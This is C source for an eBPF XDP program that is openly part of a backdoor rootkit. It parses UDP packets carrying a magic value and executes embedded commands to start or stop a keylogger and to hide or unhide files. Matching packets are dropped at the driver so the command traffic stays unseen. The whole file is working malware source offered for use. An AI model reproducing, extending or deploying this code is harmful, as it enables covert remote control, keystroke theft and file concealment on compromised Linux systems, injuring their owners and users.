#include <vmlinux.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>
#include <asm-generic/errno-base.h>
#include "bpf/backdoor.h"
#include "bpf/maps.h"

#define ETH_P_IP 0x0800

static void start_keylogger()
{
    u32 key = KEYLOGGER_ENABLED;
    u32 value = 1;

    bpf_map_update_elem(&config_map, &key, &value, BPF_ANY);
}

static void stop_keylogger()
{
    u32 key = KEYLOGGER_ENABLED;
    u32 value = 0;

    bpf_map_update_elem(&config_map, &key, &value, BPF_ANY);
}

static void hide_file(char *filename)
{
    u8 value = 1;

    bpf_map_update_elem(&hide_names_map, filename, &value, BPF_ANY);
}

static void unhide_file(char *filename)
{
    bpf_map_delete_elem(&hide_names_map, filename);
}

/**
 * @brief Process command struct and execute command according
 * to the corrsponding opcode.
 * 
 * @param command 
 * @return int returns 0 on command opcode identified and ran.
 * returns -ENOENT upon command opcode not found.
 */
static int process_and_execute_command(struct command_packet *command)
{
    char command_data[MAX_NAME_LEN];

    /* Check for magic payloads */
    switch (command->opcode) {
    case COMMAND_KEYLOGGER_START:
        start_keylogger();
        break;
    case COMMAND_KEYLOGGER_STOP:
        stop_keylogger();
        break;
    case COMMAND_HIDE_FILE:
        __builtin_memcpy(command_data, command->data, sizeof(command_data));
        hide_file(command_data);
        break;
    case COMMAND_UNHIDE_FILE:
        __builtin_memcpy(command_data, command->data, sizeof(command_data));
        unhide_file(command_data);
        break;
    default:
        return -ENOENT; /* Normal UDP traffic */
    }

    return 0;
}

/**
 * @brief Submit event to userspace via ring buffer.
 * Event includes IP, source port and command opcode.
 * 
 * @param iph 
 * @param udph 
 * @param command 
 */
static void submit_event_to_userspace(struct iphdr *iph, struct udphdr *udph, struct command_packet *command)
{
    struct event_t *event = bpf_ringbuf_reserve(&events, sizeof(*event), 0);
    if (event) {
        event->src_ip = iph->saddr;
        event->src_port = bpf_ntohs(udph->source);
        event->payload_action = command->opcode;

        /* Submit event to userspace */
        bpf_ringbuf_submit(event, 0);
    }
}

/**
 * @brief XDP fmagic packet filter to filter UDP packet with
 * a specific magic and extract command from them.
 * The commands are the executed.
 * 
 */
SEC("xdp")
int filter_magic_packets(struct xdp_md *ctx)
{
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;
    int ret = 0;

    /* Parse ethernet header */
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    if (eth->h_proto != bpf_htons(ETH_P_IP))
        return XDP_PASS;

    /* Parse IP header */
    struct iphdr *iph = (void *)(eth + 1);
    if ((void *)(iph + 1) > data_end)
        return XDP_PASS;

    if (iph->protocol != IPPROTO_UDP)
        return XDP_PASS;

    /* Parse UDP header */
    struct udphdr *udph = (void *)(iph + 1);
    if ((void *)(udph + 1) > data_end)
        return XDP_PASS;

    struct command_packet *command = (void *)(udph + 1);

    if ((void *)(command + 1) > data_end)
        return XDP_PASS;

    if (command->magic != COMMAND_MAGIC)
        return XDP_PASS;

    ret = process_and_execute_command(command);
    if (ret)
        return XDP_PASS;

    /* I don't use it in userspcae currently, but good idea to leave it here */
    submit_event_to_userspace(iph, udph, command);

    /* Drop the packet at driver level */
    return XDP_DROP;
}
